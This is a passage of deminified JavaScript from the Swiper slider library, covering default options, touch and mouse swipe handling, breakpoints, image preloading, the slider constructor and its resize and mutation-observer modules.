            touchEventsTarget: "container",
            initialSlide: 0,
            speed: 300,
            preventInteractionOnTransition: !1,
            edgeSwipeDetection: !1,
            edgeSwipeThreshold: 20,
            freeMode: !1,
            freeModeMomentum: !0,
            freeModeMomentumRatio: 1,
            freeModeMomentumBounce: !0,
            freeModeMomentumBounceRatio: 1,
            freeModeMomentumVelocityRatio: 1,
            freeModeSticky: !1,
            freeModeMinimumVelocity: .02,
            autoHeight: !1,
            setWrapperSize: !1,
            virtualTranslate: !1,
            effect: "slide",
            breakpoints: void 0,
            breakpointsInverse: !1,
            spaceBetween: 0,
            slidesPerView: 1,
            slidesPerColumn: 1,
            slidesPerColumnFill: "column",
            slidesPerGroup: 1,
            centeredSlides: !1,
            slidesOffsetBefore: 0,
            slidesOffsetAfter: 0,
            normalizeSlideIndex: !0,
            centerInsufficientSlides: !1,
            watchOverflow: !1,
            roundLengths: !1,
            touchRatio: 1,
            touchAngle: 45,
            simulateTouch: !0,
            shortSwipes: !0,
            longSwipes: !0,
            longSwipesRatio: .5,
            longSwipesMs: 300,
            followFinger: !0,
            allowTouchMove: !0,
            threshold: 0,
            touchMoveStopPropagation: !0,
            touchStartPreventDefault: !0,
            touchStartForcePreventDefault: !1,
            touchReleaseOnEdges: !1,
            uniqueNavElements: !0,
            resistance: !0,
            resistanceRatio: .85,
            watchSlidesProgress: !1,
            watchSlidesVisibility: !1,
            grabCursor: !1,
            preventClicks: !0,
            preventClicksPropagation: !0,
            slideToClickedSlide: !1,
            preloadImages: !0,
            updateOnImagesReady: !0,
            loop: !1,
            loopAdditionalSlides: 0,
            loopedSlides: null,
            loopFillGroupWithBlank: !1,
            allowSlidePrev: !0,
            allowSlideNext: !0,
            swipeHandler: null,
            noSwiping: !0,
            noSwipingClass: "swiper-no-swiping",
            noSwipingSelector: null,
            passiveListeners: !0,
            containerModifierClass: "swiper-container-",
            slideClass: "swiper-slide",
            slideBlankClass: "swiper-slide-invisible-blank",
            slideActiveClass: "swiper-slide-active",
            slideDuplicateActiveClass: "swiper-slide-duplicate-active",
            slideVisibleClass: "swiper-slide-visible",
            slideDuplicateClass: "swiper-slide-duplicate",
            slideNextClass: "swiper-slide-next",
            slideDuplicateNextClass: "swiper-slide-duplicate-next",
            slidePrevClass: "swiper-slide-prev",
            slideDuplicatePrevClass: "swiper-slide-duplicate-prev",
            wrapperClass: "swiper-wrapper",
            runCallbacksOnInit: !0
        }, C = {
            update: m, translate: v, transition: {
                setTransition: function (e, t) {
                    this.$wrapperEl.transition(e), this.emit("setTransition", e, t)
                }, transitionStart: function (e, t) {
                    void 0 === e && (e = !0);
                    var n = this, i = n.activeIndex, r = n.params, a = n.previousIndex;
                    r.autoHeight && n.updateAutoHeight(), t = t || (a < i ? "next" : i < a ? "prev" : "reset"), n.emit("transitionStart"), e && i !== a && ("reset" !== t ? (n.emit("slideChangeTransitionStart"), "next" === t ? n.emit("slideNextTransitionStart") : n.emit("slidePrevTransitionStart")) : n.emit("slideResetTransitionStart"))
                }, transitionEnd: function (e, t) {
                    void 0 === e && (e = !0);
                    var n = this, i = n.activeIndex, r = n.previousIndex;
                    n.animating = !1, n.setTransition(0), t = t || (r < i ? "next" : i < r ? "prev" : "reset"), n.emit("transitionEnd"), e && i !== r && ("reset" !== t ? (n.emit("slideChangeTransitionEnd"), "next" === t ? n.emit("slideNextTransitionEnd") : n.emit("slidePrevTransitionEnd")) : n.emit("slideResetTransitionEnd"))
                }
            }, slide: g, loop: y, grabCursor: b, manipulation: x, events: {
                attachEvents: function () {
                    var e = this, r = e.params, a = e.touchEvents, s = e.el, c = e.wrapperEl;
                    e.onTouchStart = function (e) {
                        var r, a, s, l, c = this, u = c.touchEventsData, d = c.params, p = c.touches;
                        c.animating && d.preventInteractionOnTransition || ((r = e).originalEvent && (r = r.originalEvent), u.isTouchEvent = "touchstart" === r.type, !u.isTouchEvent && "which" in r && 3 === r.which || !u.isTouchEvent && "button" in r && 0 < r.button || u.isTouched && u.isMoved || (d.noSwiping && i(r.target).closest(d.noSwipingSelector || "." + d.noSwipingClass)[0] ? c.allowClick = !0 : d.swipeHandler && !i(r).closest(d.swipeHandler)[0] || (p.currentX = ("touchstart" === r.type ? r.targetTouches[0] : r).pageX, p.currentY = ("touchstart" === r.type ? r.targetTouches[0] : r).pageY, a = p.currentX, l = p.currentY, s = d.edgeSwipeDetection || d.iOSEdgeSwipeDetection, e = d.edgeSwipeThreshold || d.iOSEdgeSwipeThreshold, s && (a <= e || a >= n.screen.width - e) || (o.extend(u, {
                            isTouched: !0,
                            isMoved: !1,
                            allowTouchCallbacks: !0,
                            isScrolling: void 0,
                            startMoving: void 0
                        }), p.startX = a, p.startY = l, u.touchStartTime = o.now(), c.allowClick = !0, c.updateSize(), c.swipeDirection = void 0, 0 < d.threshold && (u.allowThresholdMove = !1), "touchstart" !== r.type && (l = !0, i(r.target).is(u.formElements) && (l = !1), t.activeElement && i(t.activeElement).is(u.formElements) && t.activeElement !== r.target && t.activeElement.blur(), l = l && c.allowTouchMove && d.touchStartPreventDefault, (d.touchStartForcePreventDefault || l) && r.preventDefault()), c.emit("touchStart", r)))))
                    }.bind(e), e.onTouchMove = function (e) {
                        var n = this, r = n.touchEventsData, a = n.params, s = n.touches, l = n.rtlTranslate, c = e;
                        if (c.originalEvent && (c = c.originalEvent), r.isTouched) {
                            if (!r.isTouchEvent || "mousemove" !== c.type) {
                                var u = ("touchmove" === c.type ? c.targetTouches[0] : c).pageX,
                                    d = ("touchmove" === c.type ? c.targetTouches[0] : c).pageY;
                                if (c.preventedByNestedSwiper) return s.startX = u, void (s.startY = d);
                                if (!n.allowTouchMove) return n.allowClick = !1, void (r.isTouched && (o.extend(s, {
                                    startX: u,
                                    startY: d,
                                    currentX: u,
                                    currentY: d
                                }), r.touchStartTime = o.now()));
                                if (r.isTouchEvent && a.touchReleaseOnEdges && !a.loop) if (n.isVertical()) {
                                    if (d < s.startY && n.translate <= n.maxTranslate() || d > s.startY && n.translate >= n.minTranslate()) return r.isTouched = !1, void (r.isMoved = !1)
                                } else if (u < s.startX && n.translate <= n.maxTranslate() || u > s.startX && n.translate >= n.minTranslate()) return;
                                if (r.isTouchEvent && t.activeElement && c.target === t.activeElement && i(c.target).is(r.formElements)) return r.isMoved = !0, void (n.allowClick = !1);
                                if (!(r.allowTouchCallbacks && n.emit("touchMove", c), c.targetTouches && 1 < c.targetTouches.length || (s.currentX = u, s.currentY = d, e = s.currentX - s.startX, u = s.currentY - s.startY, n.params.threshold && Math.sqrt(Math.pow(e, 2) + Math.pow(u, 2)) < n.params.threshold))) if (void 0 === r.isScrolling && (n.isHorizontal() && s.currentY === s.startY || n.isVertical() && s.currentX === s.startX ? r.isScrolling = !1 : 25 <= e * e + u * u && (d = 180 * Math.atan2(Math.abs(u), Math.abs(e)) / Math.PI, r.isScrolling = n.isHorizontal() ? d > a.touchAngle : 90 - d > a.touchAngle)), r.isScrolling && n.emit("touchMoveOpposite", c), void 0 === r.startMoving && (s.currentX === s.startX && s.currentY === s.startY || (r.startMoving = !0)), r.isScrolling) r.isTouched = !1; else if (r.startMoving) {
                                    if (n.allowClick = !1, c.preventDefault(), a.touchMoveStopPropagation && !a.nested && c.stopPropagation(), r.isMoved || (a.loop && n.loopFix(), r.startTranslate = n.getTranslate(), n.setTransition(0), n.animating && n.$wrapperEl.trigger("webkitTransitionEnd transitionend"), r.allowMomentumBounce = !1, !a.grabCursor || !0 !== n.allowSlideNext && !0 !== n.allowSlidePrev || n.setGrabCursor(!0), n.emit("sliderFirstMove", c)), n.emit("sliderMove", c), r.isMoved = !0, e = n.isHorizontal() ? e : u, s.diff = e, e *= a.touchRatio, n.swipeDirection = 0 < (e = l ? -e : e) ? "prev" : "next", r.currentTranslate = e + r.startTranslate, u = !0, l = a.resistanceRatio, a.touchReleaseOnEdges && (l = 0), 0 < e && r.currentTranslate > n.minTranslate() ? (u = !1, a.resistance && (r.currentTranslate = n.minTranslate() - 1 + Math.pow(-n.minTranslate() + r.startTranslate + e, l))) : e < 0 && r.currentTranslate < n.maxTranslate() && (u = !1, a.resistance && (r.currentTranslate = n.maxTranslate() + 1 - Math.pow(n.maxTranslate() - r.startTranslate - e, l))), u && (c.preventedByNestedSwiper = !0), !n.allowSlideNext && "next" === n.swipeDirection && r.currentTranslate < r.startTranslate && (r.currentTranslate = r.startTranslate), !n.allowSlidePrev && "prev" === n.swipeDirection && r.currentTranslate > r.startTranslate && (r.currentTranslate = r.startTranslate), 0 < a.threshold) {
                                        if (!(Math.abs(e) > a.threshold || r.allowThresholdMove)) return void (r.currentTranslate = r.startTranslate);
                                        if (!r.allowThresholdMove) return r.allowThresholdMove = !0, s.startX = s.currentX, s.startY = s.currentY, r.currentTranslate = r.startTranslate, void (s.diff = n.isHorizontal() ? s.currentX - s.startX : s.currentY - s.startY)
                                    }
                                    a.followFinger && ((a.freeMode || a.watchSlidesProgress || a.watchSlidesVisibility) && (n.updateActiveIndex(), n.updateSlidesClasses()), a.freeMode && (0 === r.velocities.length && r.velocities.push({
                                        position: s[n.isHorizontal() ? "startX" : "startY"],
                                        time: r.touchStartTime
                                    }), r.velocities.push({
                                        position: s[n.isHorizontal() ? "currentX" : "currentY"],
                                        time: o.now()
                                    })), n.updateProgress(r.currentTranslate), n.setTranslate(r.currentTranslate))
                                }
                            }
                        } else r.startMoving && r.isScrolling && n.emit("touchMoveOpposite", c)
                    }.bind(e), e.onTouchEnd = function (e) {
                        var t = this, n = t.touchEventsData, i = t.params, r = t.touches, a = t.rtlTranslate,
                            s = t.$wrapperEl, l = t.slidesGrid, c = t.snapGrid, u = e;
                        if (u.originalEvent && (u = u.originalEvent), n.allowTouchCallbacks && t.emit("touchEnd", u), n.allowTouchCallbacks = !1, !n.isTouched) return n.isMoved && i.grabCursor && t.setGrabCursor(!1), n.isMoved = !1, void (n.startMoving = !1);
                        i.grabCursor && n.isMoved && n.isTouched && (!0 === t.allowSlideNext || !0 === t.allowSlidePrev) && t.setGrabCursor(!1);
                        var d, p = o.now();
                        e = p - n.touchStartTime;
                        if (t.allowClick && (t.updateClickedSlide(u), t.emit("tap", u), e < 300 && 300 < p - n.lastClickTime && (n.clickTimeout && clearTimeout(n.clickTimeout), n.clickTimeout = o.nextTick((function () {
                            t && !t.destroyed && t.emit("click", u)
                        }), 300)), e < 300 && p - n.lastClickTime < 300 && (n.clickTimeout && clearTimeout(n.clickTimeout), t.emit("doubleTap", u))), n.lastClickTime = o.now(), o.nextTick((function () {
                            t.destroyed || (t.allowClick = !0)
                        })), !n.isTouched || !n.isMoved || !t.swipeDirection || 0 === r.diff || n.currentTranslate === n.startTranslate) return n.isTouched = !1, n.isMoved = !1, void (n.startMoving = !1);
                        if (n.isTouched = !1, n.isMoved = !1, n.startMoving = !1, d = i.followFinger ? a ? t.translate : -t.translate : -n.currentTranslate, i.freeMode) if (d < -t.minTranslate()) t.slideTo(t.activeIndex); else if (d > -t.maxTranslate()) t.slides.length < c.length ? t.slideTo(c.length - 1) : t.slideTo(t.slides.length - 1); else {
                            if (i.freeModeMomentum) {
                                1 < n.velocities.length ? (y = n.velocities.pop(), f = n.velocities.pop(), h = y.position - f.position, f = y.time - f.time, t.velocity = h / f, t.velocity /= 2, Math.abs(t.velocity) < i.freeModeMinimumVelocity && (t.velocity = 0), (150 < f || 300 < o.now() - y.time) && (t.velocity = 0)) : t.velocity = 0, t.velocity *= i.freeModeMomentumVelocityRatio, n.velocities.length = 0;
                                var h = 1e3 * i.freeModeMomentumRatio, f = t.velocity * h, m = t.translate + f;
                                a && (m = -m);
                                var v, g, y = !1;
                                f = 20 * Math.abs(t.velocity) * i.freeModeMomentumBounceRatio;
                                if (m < t.maxTranslate()) i.freeModeMomentumBounce ? (m + t.maxTranslate() < -f && (m = t.maxTranslate() - f), v = t.maxTranslate(), n.allowMomentumBounce = y = !0) : m = t.maxTranslate(), i.loop && i.centeredSlides && (g = !0); else if (m > t.minTranslate()) i.freeModeMomentumBounce ? (m - t.minTranslate() > f && (m = t.minTranslate() + f), v = t.minTranslate(), n.allowMomentumBounce = y = !0) : m = t.minTranslate(), i.loop && i.centeredSlides && (g = !0); else if (i.freeModeSticky) {
                                    for (var b, x = 0; x < c.length; x += 1) if (c[x] > -m) {
                                        b = x;
                                        break
                                    }
                                    m = -(Math.abs(c[b] - m) < Math.abs(c[b - 1] - m) || "next" === t.swipeDirection ? c[b] : c[b - 1])
                                }
                                if (g && t.once("transitionEnd", (function () {
                                    t.loopFix()
                                })), 0 !== t.velocity) h = a ? Math.abs((-m - t.translate) / t.velocity) : Math.abs((m - t.translate) / t.velocity); else if (i.freeModeSticky) return void t.slideToClosest();
                                i.freeModeMomentumBounce && y ? (t.updateProgress(v), t.setTransition(h), t.setTranslate(m), t.transitionStart(!0, t.swipeDirection), t.animating = !0, s.transitionEnd((function () {
                                    t && !t.destroyed && n.allowMomentumBounce && (t.emit("momentumBounce"), t.setTransition(i.speed), t.setTranslate(v), s.transitionEnd((function () {
                                        t && !t.destroyed && t.transitionEnd()
                                    })))
                                }))) : t.velocity ? (t.updateProgress(m), t.setTransition(h), t.setTranslate(m), t.transitionStart(!0, t.swipeDirection), t.animating || (t.animating = !0, s.transitionEnd((function () {
                                    t && !t.destroyed && t.transitionEnd()
                                })))) : t.updateProgress(m), t.updateActiveIndex(), t.updateSlidesClasses()
                            } else if (i.freeModeSticky) return void t.slideToClosest();
                            (!i.freeModeMomentum || e >= i.longSwipesMs) && (t.updateProgress(), t.updateActiveIndex(), t.updateSlidesClasses())
                        } else {
                            for (var w = 0, S = t.slidesSizesGrid[0], E = 0; E < l.length; E += i.slidesPerGroup) void 0 !== l[E + i.slidesPerGroup] ? d >= l[E] && d < l[E + i.slidesPerGroup] && (S = l[(w = E) + i.slidesPerGroup] - l[E]) : d >= l[E] && (w = E, S = l[l.length - 1] - l[l.length - 2]);
                            h = (d - l[w]) / S, e > i.longSwipesMs ? i.longSwipes ? ("next" === t.swipeDirection && (h >= i.longSwipesRatio ? t.slideTo(w + i.slidesPerGroup) : t.slideTo(w)), "prev" === t.swipeDirection && (h > 1 - i.longSwipesRatio ? t.slideTo(w + i.slidesPerGroup) : t.slideTo(w))) : t.slideTo(t.activeIndex) : i.shortSwipes ? ("next" === t.swipeDirection && t.slideTo(w + i.slidesPerGroup), "prev" === t.swipeDirection && t.slideTo(w)) : t.slideTo(t.activeIndex)
                        }
                    }.bind(e), e.onClick = function (e) {
                        this.allowClick || (this.params.preventClicks && e.preventDefault(), this.params.preventClicksPropagation && this.animating && (e.stopPropagation(), e.stopImmediatePropagation()))
                    }.bind(e);
                    var u = "container" === r.touchEventsTarget ? s : c;
                    s = !!r.nested;
                    l.touch || !l.pointerEvents && !l.prefixedPointerEvents ? (l.touch && (c = !("touchstart" !== a.start || !l.passiveListener || !r.passiveListeners) && {
                        passive: !0,
                        capture: !1
                    }, u.addEventListener(a.start, e.onTouchStart, c), u.addEventListener(a.move, e.onTouchMove, l.passiveListener ? {
                        passive: !1,
                        capture: s
                    } : s), u.addEventListener(a.end, e.onTouchEnd, c)), (r.simulateTouch && !w.ios && !w.android || r.simulateTouch && !l.touch && w.ios) && (u.addEventListener("mousedown", e.onTouchStart, !1), t.addEventListener("mousemove", e.onTouchMove, s), t.addEventListener("mouseup", e.onTouchEnd, !1))) : (u.addEventListener(a.start, e.onTouchStart, !1), t.addEventListener(a.move, e.onTouchMove, s), t.addEventListener(a.end, e.onTouchEnd, !1)), (r.preventClicks || r.preventClicksPropagation) && u.addEventListener("click", e.onClick, !0), e.on(w.ios || w.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", S, !0)
                }, detachEvents: function () {
                    var e = this, n = e.params, i = e.touchEvents, r = e.el, a = e.wrapperEl,
                        s = "container" === n.touchEventsTarget ? r : a;
                    r = !!n.nested;
                    l.touch || !l.pointerEvents && !l.prefixedPointerEvents ? (l.touch && (a = !("onTouchStart" !== i.start || !l.passiveListener || !n.passiveListeners) && {
                        passive: !0,
                        capture: !1
                    }, s.removeEventListener(i.start, e.onTouchStart, a), s.removeEventListener(i.move, e.onTouchMove, r), s.removeEventListener(i.end, e.onTouchEnd, a)), (n.simulateTouch && !w.ios && !w.android || n.simulateTouch && !l.touch && w.ios) && (s.removeEventListener("mousedown", e.onTouchStart, !1), t.removeEventListener("mousemove", e.onTouchMove, r), t.removeEventListener("mouseup", e.onTouchEnd, !1))) : (s.removeEventListener(i.start, e.onTouchStart, !1), t.removeEventListener(i.move, e.onTouchMove, r), t.removeEventListener(i.end, e.onTouchEnd, !1)), (n.preventClicks || n.preventClicksPropagation) && s.removeEventListener("click", e.onClick, !0), e.off(w.ios || w.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", S)
                }
            }, breakpoints: {
                setBreakpoint: function () {
                    var e = this, t = e.activeIndex, n = e.initialized, i = e.loopedSlides;
                    void 0 === i && (i = 0);
                    var r, a, s, l = e.params, c = l.breakpoints;
                    c && 0 !== Object.keys(c).length && (r = e.getBreakpoint(c)) && e.currentBreakpoint !== r && ((a = r in c ? c[r] : void 0) && ["slidesPerView", "spaceBetween", "slidesPerGroup"].forEach((function (e) {
                        var t = a[e];
                        void 0 !== t && (a[e] = "slidesPerView" !== e || "AUTO" !== t && "auto" !== t ? "slidesPerView" === e ? parseFloat(t) : parseInt(t, 10) : "auto")
                    })), c = (s = a || e.originalParams).direction && s.direction !== l.direction, l = l.loop && (s.slidesPerView !== l.slidesPerView || c), c && n && e.changeDirection(), o.extend(e.params, s), o.extend(e, {
                        allowTouchMove: e.params.allowTouchMove,
                        allowSlideNext: e.params.allowSlideNext,
                        allowSlidePrev: e.params.allowSlidePrev
                    }), e.currentBreakpoint = r, l && n && (e.loopDestroy(), e.loopCreate(), e.updateSlides(), e.slideTo(t - i + e.loopedSlides, 0, !1)), e.emit("breakpoint", s))
                }, getBreakpoint: function (e) {
                    if (e) {
                        var t = !1, i = [];
                        Object.keys(e).forEach((function (e) {
                            i.push(e)
                        })), i.sort((function (e, t) {
                            return parseInt(e, 10) - parseInt(t, 10)
                        }));
                        for (var r = 0; r < i.length; r += 1) {
                            var a = i[r];
                            this.params.breakpointsInverse ? a <= n.innerWidth && (t = a) : a >= n.innerWidth && !t && (t = a)
                        }
                        return t || "max"
                    }
                }
            }, checkOverflow: {
                checkOverflow: function () {
                    var e = this, t = e.isLocked;
                    e.isLocked = 1 === e.snapGrid.length, e.allowSlideNext = !e.isLocked, e.allowSlidePrev = !e.isLocked, t !== e.isLocked && e.emit(e.isLocked ? "lock" : "unlock"), t && t !== e.isLocked && (e.isEnd = !1, e.navigation.update())
                }
            }, classes: {
                addClasses: function () {
                    var e = this.classNames, t = this.params, n = this.rtl, i = this.$el, r = [];
                    r.push("initialized"), r.push(t.direction), t.freeMode && r.push("free-mode"), l.flexbox || r.push("no-flexbox"), t.autoHeight && r.push("autoheight"), n && r.push("rtl"), 1 < t.slidesPerColumn && r.push("multirow"), w.android && r.push("android"), w.ios && r.push("ios"), (c.isIE || c.isEdge) && (l.pointerEvents || l.prefixedPointerEvents) && r.push("wp8-" + t.direction), r.forEach((function (n) {
                        e.push(t.containerModifierClass + n)
                    })), i.addClass(e.join(" "))
                }, removeClasses: function () {
                    var e = this.$el, t = this.classNames;
                    e.removeClass(t.join(" "))
                }
            }, images: {
                loadImage: function (e, t, i, r, a, s) {
                    function o() {
                        s && s()
                    }

                    e.complete && a || !t ? o() : ((a = new n.Image).onload = o, a.onerror = o, r && (a.sizes = r), i && (a.srcset = i), t && (a.src = t))
                }, preloadImages: function () {
                    var e = this;

                    function t() {
                        null != e && e && !e.destroyed && (void 0 !== e.imagesLoaded && (e.imagesLoaded += 1), e.imagesLoaded === e.imagesToLoad.length && (e.params.updateOnImagesReady && e.update(), e.emit("imagesReady")))
                    }

                    e.imagesToLoad = e.$el.find("img");
                    for (var n = 0; n < e.imagesToLoad.length; n += 1) {
                        var i = e.imagesToLoad[n];
                        e.loadImage(i, i.currentSrc || i.getAttribute("src"), i.srcset || i.getAttribute("srcset"), i.sizes || i.getAttribute("sizes"), !0, t)
                    }
                }
            }
        }, T = {}, k = function (e) {
            function t() {
                for (var n, r, a = [], s = arguments.length; s--;) a[s] = arguments[s];
                r = (r = 1 === a.length && a[0].constructor && a[0].constructor === Object ? a[0] : (n = a[0], a[1])) || {}, r = o.extend({}, r), n && !r.el && (r.el = n), e.call(this, r), Object.keys(C).forEach((function (e) {
                    Object.keys(C[e]).forEach((function (n) {
                        t.prototype[n] || (t.prototype[n] = C[e][n])
                    }))
                }));
                var c = this;
                void 0 === c.modules && (c.modules = {}), Object.keys(c.modules).forEach((function (e) {
                    var t = c.modules[e];
                    t.params && (e = Object.keys(t.params)[0], "object" == typeof (t = t.params[e]) && null !== t && e in r && "enabled" in t && (!0 === r[e] && (r[e] = {enabled: !0}), "object" != typeof r[e] || "enabled" in r[e] || (r[e].enabled = !0), r[e] || (r[e] = {enabled: !1})))
                }));
                var u = o.extend({}, E);
                c.useModulesParams(u), c.params = o.extend({}, u, T, r), c.originalParams = o.extend({}, c.params), c.passedParams = o.extend({}, r);
                var d = (c.$ = i)(c.params.el);
                if (n = d[0]) {
                    if (1 < d.length) {
                        var p = [];
                        return d.each((function (e, n) {
                            n = o.extend({}, r, {el: n}), p.push(new t(n))
                        })), p
                    }
                    n.swiper = c, d.data("swiper", c);
                    u = d.children("." + c.params.wrapperClass);
                    return o.extend(c, {
                        $el: d,
                        el: n,
                        $wrapperEl: u,
                        wrapperEl: u[0],
                        classNames: [],
                        slides: i(),
                        slidesGrid: [],
                        snapGrid: [],
                        slidesSizesGrid: [],
                        isHorizontal: function () {
                            return "horizontal" === c.params.direction
                        },
                        isVertical: function () {
                            return "vertical" === c.params.direction
                        },
                        rtl: "rtl" === n.dir.toLowerCase() || "rtl" === d.css("direction"),
                        rtlTranslate: "horizontal" === c.params.direction && ("rtl" === n.dir.toLowerCase() || "rtl" === d.css("direction")),
                        wrongRTL: "-webkit-box" === u.css("display"),
                        activeIndex: 0,
                        realIndex: 0,
                        isBeginning: !0,
                        isEnd: !1,
                        translate: 0,
                        previousTranslate: 0,
                        progress: 0,
                        velocity: 0,
                        animating: !1,
                        allowSlideNext: c.params.allowSlideNext,
                        allowSlidePrev: c.params.allowSlidePrev,
                        touchEvents: (d = ["mousedown", "mousemove", "mouseup"], l.pointerEvents ? d = ["pointerdown", "pointermove", "pointerup"] : l.prefixedPointerEvents && (d = ["MSPointerDown", "MSPointerMove", "MSPointerUp"]), c.touchEventsTouch = {
                            start: (u = ["touchstart", "touchmove", "touchend"])[0],
                            move: u[1],
                            end: u[2]
                        }, c.touchEventsDesktop = {
                            start: d[0],
                            move: d[1],
                            end: d[2]
                        }, l.touch || !c.params.simulateTouch ? c.touchEventsTouch : c.touchEventsDesktop),
                        touchEventsData: {
                            isTouched: void 0,
                            isMoved: void 0,
                            allowTouchCallbacks: void 0,
                            touchStartTime: void 0,
                            isScrolling: void 0,
                            currentTranslate: void 0,
                            startTranslate: void 0,
                            allowThresholdMove: void 0,
                            formElements: "input, select, option, textarea, button, video",
                            lastClickTime: o.now(),
                            clickTimeout: void 0,
                            velocities: [],
                            allowMomentumBounce: void 0,
                            isTouchEvent: void 0,
                            startMoving: void 0
                        },
                        allowClick: !0,
                        allowTouchMove: c.params.allowTouchMove,
                        touches: {startX: 0, startY: 0, currentX: 0, currentY: 0, diff: 0},
                        imagesToLoad: [],
                        imagesLoaded: 0
                    }), c.useModules(), c.params.init && c.init(), c
                }
            }

            e && (t.__proto__ = e);
            var n = {
                extendedDefaults: {configurable: !0},
                defaults: {configurable: !0},
                Class: {configurable: !0},
                $: {configurable: !0}
            };
            return ((t.prototype = Object.create(e && e.prototype)).constructor = t).prototype.slidesPerViewDynamic = function () {
                var e = this, t = e.params, n = e.slides, i = e.slidesGrid, r = e.size, a = e.activeIndex, s = 1;
                if (t.centeredSlides) {
                    for (var o, l = n[a].swiperSlideSize, c = a + 1; c < n.length; c += 1) n[c] && !o && (s += 1, r < (l += n[c].swiperSlideSize) && (o = !0));
                    for (var u = a - 1; 0 <= u; --u) n[u] && !o && (s += 1, r < (l += n[u].swiperSlideSize) && (o = !0))
                } else for (var d = a + 1; d < n.length; d += 1) i[d] - i[a] < r && (s += 1);
                return s
            }, t.prototype.update = function () {
                var e, t, n = this;

                function i() {
                    var e = n.rtlTranslate ? -1 * n.translate : n.translate;
                    e = Math.min(Math.max(e, n.maxTranslate()), n.minTranslate());
                    n.setTranslate(e), n.updateActiveIndex(), n.updateSlidesClasses()
                }

                n && !n.destroyed && (e = n.snapGrid, (t = n.params).breakpoints && n.setBreakpoint(), n.updateSize(), n.updateSlides(), n.updateProgress(), n.updateSlidesClasses(), n.params.freeMode ? (i(), n.params.autoHeight && n.updateAutoHeight()) : (("auto" === n.params.slidesPerView || 1 < n.params.slidesPerView) && n.isEnd && !n.params.centeredSlides ? n.slideTo(n.slides.length - 1, 0, !1, !0) : n.slideTo(n.activeIndex, 0, !1, !0)) || i(), t.watchOverflow && e !== n.snapGrid && n.checkOverflow(), n.emit("update"))
            }, t.prototype.changeDirection = function (e, t) {
                void 0 === t && (t = !0);
                var n = this, i = n.params.direction;
                return (e = e || ("horizontal" === i ? "vertical" : "horizontal")) === i || "horizontal" !== e && "vertical" !== e || ("vertical" === i && (n.$el.removeClass(n.params.containerModifierClass + "vertical wp8-vertical").addClass("" + n.params.containerModifierClass + e), (c.isIE || c.isEdge) && (l.pointerEvents || l.prefixedPointerEvents) && n.$el.addClass(n.params.containerModifierClass + "wp8-" + e)), "horizontal" === i && (n.$el.removeClass(n.params.containerModifierClass + "horizontal wp8-horizontal").addClass("" + n.params.containerModifierClass + e), (c.isIE || c.isEdge) && (l.pointerEvents || l.prefixedPointerEvents) && n.$el.addClass(n.params.containerModifierClass + "wp8-" + e)), n.params.direction = e, n.slides.each((function (t, n) {
                    "vertical" === e ? n.style.width = "" : n.style.height = ""
                })), n.emit("changeDirection"), t && n.update()), n
            }, t.prototype.init = function () {
                var e = this;
                e.initialized || (e.emit("beforeInit"), e.params.breakpoints && e.setBreakpoint(), e.addClasses(), e.params.loop && e.loopCreate(), e.updateSize(), e.updateSlides(), e.params.watchOverflow && e.checkOverflow(), e.params.grabCursor && e.setGrabCursor(), e.params.preloadImages && e.preloadImages(), e.params.loop ? e.slideTo(e.params.initialSlide + e.loopedSlides, 0, e.params.runCallbacksOnInit) : e.slideTo(e.params.initialSlide, 0, e.params.runCallbacksOnInit), e.attachEvents(), e.initialized = !0, e.emit("init"))
            }, t.prototype.destroy = function (e, t) {
                void 0 === e && (e = !0), void 0 === t && (t = !0);
                var n = this, i = n.params, r = n.$el, a = n.$wrapperEl, s = n.slides;
                return void 0 === n.params || n.destroyed || (n.emit("beforeDestroy"), n.initialized = !1, n.detachEvents(), i.loop && n.loopDestroy(), t && (n.removeClasses(), r.removeAttr("style"), a.removeAttr("style"), s && s.length && s.removeClass([i.slideVisibleClass, i.slideActiveClass, i.slideNextClass, i.slidePrevClass].join(" ")).removeAttr("style").removeAttr("data-swiper-slide-index").removeAttr("data-swiper-column").removeAttr("data-swiper-row")), n.emit("destroy"), Object.keys(n.eventsListeners).forEach((function (e) {
                    n.off(e)
                })), !1 !== e && (n.$el[0].swiper = null, n.$el.data("swiper", null), o.deleteProps(n)), n.destroyed = !0), null
            }, t.extendDefaults = function (e) {
                o.extend(T, e)
            }, n.extendedDefaults.get = function () {
                return T
            }, n.defaults.get = function () {
                return E
            }, n.Class.get = function () {
                return e
            }, n.$.get = function () {
                return i
            }, Object.defineProperties(t, n), t
        }(u), P = {name: "device", proto: {device: w}, static: {device: w}},
        M = {name: "support", proto: {support: l}, static: {support: l}},
        L = {name: "browser", proto: {browser: c}, static: {browser: c}}, I = (m = {
            name: "resize", create: function () {
                var e = this;
                o.extend(e, {
                    resize: {
                        resizeHandler: function () {
                            e && !e.destroyed && e.initialized && (e.emit("beforeResize"), e.emit("resize"))
                        }, orientationChangeHandler: function () {
                            e && !e.destroyed && e.initialized && e.emit("orientationchange")
                        }
                    }
                })
            }, on: {
                init: function () {
                    n.addEventListener("resize", this.resize.resizeHandler), n.addEventListener("orientationchange", this.resize.orientationChangeHandler)
                }, destroy: function () {
                    n.removeEventListener("resize", this.resize.resizeHandler), n.removeEventListener("orientationchange", this.resize.orientationChangeHandler)
                }
            }
        }, {
            func: n.MutationObserver || n.WebkitMutationObserver, attach: function (e, t) {
                void 0 === t && (t = {});
                var i = this, r = new I.func((function (e) {
                    var t;
                    1 !== e.length ? (t = function () {
                        i.emit("observerUpdate", e[0])
                    }, n.requestAnimationFrame ? n.requestAnimationFrame(t) : n.setTimeout(t, 0)) : i.emit("observerUpdate", e[0])
                }));
                r.observe(e, {
                    attributes: void 0 === t.attributes || t.attributes,
                    childList: void 0 === t.childList || t.childList,
                    characterData: void 0 === t.characterData || t.characterData
                }), i.observer.observers.push(r)
            }, init: function () {
                var e = this;
                if (l.observer && e.params.observer) {
                    if (e.params.observeParents) for (var t = e.$el.parents(), n = 0; n < t.length; n += 1) e.observer.attach(t[n]);
                    e.observer.attach(e.$el[0], {childList: e.params.observeSlideChildren}), e.observer.attach(e.$wrapperEl[0], {attributes: !1})
                }
            }, destroy: function () {
                this.observer.observers.forEach((function (e) {
                    e.disconnect()
                })), this.observer.observers = []
            }
        }), A = (v = {
            name: "observer",
            params: {observer: !1, observeParents: !1, observeSlideChildren: !1},
            create: function () {
                o.extend(this, {
                    observer: {
                        init: I.init.bind(this),
                        attach: I.attach.bind(this),
                        destroy: I.destroy.bind(this),
                        observers: []
                    }
                })
            },
            on: {
                init: function () {
                    this.observer.init()
                }, destroy: function () {
                    this.observer.destroy()
                }
            }
        }, {
